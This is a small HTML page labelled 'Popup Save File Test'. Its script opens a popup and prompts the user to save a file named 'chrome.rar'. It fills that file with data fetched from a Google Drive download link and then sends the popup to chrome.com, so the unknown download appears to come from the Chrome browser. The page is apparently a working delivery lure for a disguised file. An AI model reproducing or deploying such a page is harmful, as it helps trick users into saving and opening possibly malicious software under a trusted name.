<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Popup Save File Test</title>
<style>
body { font-family:sans-serif;padding:20px }
button { padding:12px 18px;font-size:16px }
pre { background:#111;color:#0f0;padding:10px }
</style>
</head>
<body>

<h3>Popup Save File Test</h3>
<button id="btn">Open Popup</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";

document.getElementById("btn").onclick = async () => {

  log("[1] Opening popup");

  const w = window.open("about:blank","_blank");

  if(!w){
    log("[ERROR] popup blocked");
    return;
  }

  try {

    log("[2] Opening save file picker");

    const handle = await window.showSaveFilePicker({
      suggestedName: "chrome.rar"
    });

    const writable = await handle.createWritable();

    const response = await fetch(
      "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL"
    );

    const blob = await response.blob();

    await writable.write(blob);
    await writable.close();

    log("[3] File saved");

  } catch(e) {
    log("[ERROR] " + e);
  }

  log("[4] Navigating popup to chrome.com");

  w.location.href = "https://chrome.com";

};
</script>

</body>
</html>
